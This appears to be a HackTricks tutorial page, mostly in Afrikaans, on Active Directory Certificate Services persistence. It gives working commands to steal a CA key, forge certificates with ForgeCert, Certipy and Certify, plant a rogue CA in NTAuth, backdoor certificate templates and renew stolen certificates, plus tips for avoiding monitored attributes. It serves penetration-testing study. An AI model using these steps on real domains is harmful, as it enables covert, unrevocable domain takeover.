# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Dit is 'n opsomming van die domein-persistensie-tegnieke gedeel in [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Kyk daar vir verdere besonderhede.

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

How can you tell that a certificate is a CA certificate?

Daar kan bepaal word dat 'n sertifikaat 'n CA-sertifikaat is as verskeie voorwaardes nagekom word:

- Die sertifikaat is gestoor op die CA-bediener, met sy private sleutel beveilig deur die masjien se DPAPI, of deur hardeware soos 'n TPM/HSM indien die bedryfstelsel dit ondersteun.
- Beide die Issuer- en Subject-velde van die sertifikaat stem ooreen met die distinguished name van die CA.
- 'n "CA Version" uitbreiding kom uitsluitlik in CA-sertifikate voor.
- Die sertifikaat het geen Extended Key Usage (EKU)-velde nie.

Om die private sleutel van hierdie sertifikaat te onttrek, is die `certsrv.msc`-instrument op die CA-bediener die ondersteunde metode via die ingeboude GUI. Nietemin verskil hierdie sertifikaat nie van ander wat in die stelsel gestoor is nie; dus kan metodes soos die [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) toegepas word vir onttrekking.

Die sertifikaat en private sleutel kan ook deur Certipy verkry word met die volgende opdrag:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Sodra die CA-sertifikaat en die privaat sleutel in `.pfx`-formaat verkry is, kan gereedskap soos [ForgeCert](https://github.com/GhostPack/ForgeCert) gebruik word om geldige sertifikate te genereer:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Die gebruiker wat geteiken word vir sertifikaatvervalsing moet aktief wees en in staat wees om in Active Directory te autentiseer sodat die proses kan slaag. Om 'n sertifikaat vir spesiale rekeninge soos krbtgt te vervals is ondoeltreffend.

Hierdie vervalste sertifikaat sal **geldig** wees tot die gespesifiseerde einddatum en **so lank as wat die root CA-sertifikaat geldig is** (gewoonlik van 5 tot **10+ jaar**). Dit is ook geldig vir **masjiene**, so gekombineer met **S4U2Self** kan 'n aanvaller **volhoubaarheid op enige domeinmasjien handhaaf** vir so lank as wat die CA-sertifikaat geldig is.\ Verder kan die **sertifikate wat met hierdie metode gegenereer is** **nie herroep word nie**, aangesien die CA nie daarvan bewus is.

### Werking onder Strong Certificate Mapping Enforcement (2025+)

Sedert 11 Februarie 2025 (na die uitrol van KB5014754), stel domeincontrollers standaard op **Full Enforcement** vir sertifikaatkarterings. Prakties beteken dit dat jou vervalste sertifikate óf:

- Bevat 'n sterk binding aan die teikenrekening (byvoorbeeld, die SID security extension), of
- Word gepaard met 'n sterk, eksplisiete kartering op die teikenobject se `altSecurityIdentities` attribuut.

'n Betroubare benadering vir volhoubaarheid is om 'n vervalste sertifikaat te skep wat gekoppel is aan die gesteelde Enterprise CA en dan 'n sterk, eksplisiete kartering by die slagoffer-prinsipaal te voeg:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Aantekeninge
- As jy vervalste sertifikate kan skep wat die SID security extension insluit, sal dit implisiet gemap word selfs onder Full Enforcement. Andersins, verkies eksplisiete sterk mappinge. Sien [account-persistence](account-persistence.md) vir meer oor eksplisiete mappinge.
- Herroeping help verdedigers hier nie: vervalste sertifikate is onbekend aan die CA-databasis en kan dus nie herroep word nie.

#### Full-Enforcement-verenigbare vervalsing (SID-aware)

Opgedateerde gereedskap laat jou toe om die SID direk in te sluit, sodat golden certificates bruikbaar bly selfs wanneer DCs swak mappinge verwerp:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Deur die SID in te sluit vermy jy om `altSecurityIdentities` te raak, wat moontlik gemonitor word, terwyl jy steeds aan sterk mappingkontroles voldoen.

## Trusting Rogue CA Certificates - DPERSIST2

Die `NTAuthCertificates`-object is gedefinieer om een of meer **CA certificates** binne sy `cacertificate`-attribuut te bevat, wat Active Directory (AD) gebruik. Die verifikasieproses deur die **domain controller** behels die nagaan van die `NTAuthCertificates`-object vir 'n inskrywing wat ooreenstem met die **CA specified** in die Issuer-veld van die autentiserende **certificate**. Authentication gaan voort as 'n ooreenkoms gevind word.

'n Self-signed CA certificate kan deur 'n attacker by die `NTAuthCertificates`-object gevoeg word, mits hulle beheer oor hierdie AD-object het. Gewoonlik word slegs lede van die **Enterprise Admin**-groep, sowel as **Domain Admins** of **Administrators** in die **forest root’s domain**, gemagtig om hierdie object te wysig. Hulle kan die `NTAuthCertificates`-object wysig met `certutil.exe` met die opdrag `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, of deur die gebruik van die [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Bykomende nuttige opdragte vir hierdie tegniek:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Hierdie vermoë is veral relevant wanneer dit saam met 'n vroeër beskryfde metode gebruik word wat ForgeCert insluit om sertifikate dinamies te genereer.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Daar is baie geleenthede vir **persistence** deur **security descriptor modifications of AD CS**-komponente. Modifikasies wat in die "[Domain Escalation](domain-escalation.md)"-afdeling beskryf word, kan kwaadwillig deur 'n aanvaller met verhewe toegang geïmplementeer word. Dit sluit die toevoeging van "control rights" (bv. WriteOwner/WriteDACL/etc.) tot sensitiewe komponente in, soos:

- Die **CA server’s AD computer** object
- Die **CA server’s RPC/DCOM server**
- Enige **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (byvoorbeeld die Certificate Templates container, Certification Authorities container, die NTAuthCertificates object, ens.)
- **AD groups delegated rights to control AD CS** standaard of deur die organisasie (soos die ingeboude Cert Publishers group en enige van sy lede)

'n Voorbeeld van 'n kwaadwillige implementering sou behels dat 'n aanvaller, wat oor **elevated permissions** in die domein beskik, die **`WriteOwner`**-permisisie by die standaard **`User`** certificate template voeg, met die aanvaller as die prinsipaal vir die reg. Om dit te benut sou die aanvaller eers die eienaarskap van die **`User`** template na homself verander. Daarna sou die **`mspki-certificate-name-flag`** op die template op **1** gestel word om **`ENROLLEE_SUPPLIES_SUBJECT`** te aktiveer, wat 'n gebruiker toelaat om 'n Subject Alternative Name in die aanvraag te verskaf. Vervolgens kon die aanvaller die **template** gebruik om te **enroll**, 'n **domain administrator** naam as 'n alternatiewe naam kies, en die verkrygde sertifikaat vir verifikasie as die DA gebruik.

Praktiese instellings wat aanvallers moontlik stel vir langtermyn domein persistence (sien {{#ref}}domain-escalation.md{{#endref}} vir volle besonderhede en opsporing):

- CA policy flags that allow SAN from requesters (e.g., enabling `EDITF_ATTRIBUTESUBJECTALTNAME2`). This keeps ESC1-like paths exploitable.
- Template DACL or settings that allow authentication-capable issuance (e.g., adding Client Authentication EKU, enabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlling the `NTAuthCertificates` object or the CA containers to continuously re-introduce rogue issuers if defenders attempt cleanup.

> [!TIP]
> In geharde omgewings ná KB5014754, sal die kombinasie van hierdie wankonfigurasies met eksplisiete sterk mappings (`altSecurityIdentities`) verseker dat jou uitgereikte of vervalste sertifikate bruikbaar bly selfs wanneer DCs sterk mapping afdwing.

### Certificate renewal abuse (ESC14) for persistence

As jy 'n authentication-capable sertifikaat (of 'n Enrollment Agent een) kompromitteer, kan jy dit **vir onbepaalde tyd hernu** solank die uitreikende template gepubliseer bly en jou CA steeds die uitreikerketting vertrou. Hernu behou die oorspronklike identiteitsbindings maar verleng die geldigheid, wat uitsetting moeilik maak tensy die template reggemaak word of die CA herpubliseer word.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
As domeincontrollers in **Full Enforcement** verkeer, voeg `-sid <victim SID>` by (of gebruik 'n template wat steeds die SID security extension insluit) sodat die hernieuwde leaf certificate steeds sterk gekoppel bly sonder om `altSecurityIdentities` aan te raak. Aanvallers met CA admin regte kan ook `policy\RenewalValidityPeriodUnits` fyn afstem om hernuwde geldigheidsperiodes te verleng voordat hulle hulself 'n cert uitreik.


## Verwysings

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
